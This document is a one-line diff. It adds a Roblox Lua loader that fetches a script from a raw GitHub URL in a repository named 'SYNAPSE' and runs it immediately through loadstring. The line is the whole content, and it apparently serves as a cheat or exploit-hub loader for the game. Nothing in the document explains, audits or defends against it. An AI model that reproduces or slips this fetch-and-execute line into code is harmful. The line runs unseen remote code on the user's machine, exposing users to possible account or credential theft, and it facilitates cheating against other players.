@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EHUBWINNING/SYNAPSE/main/V2.lua"))()
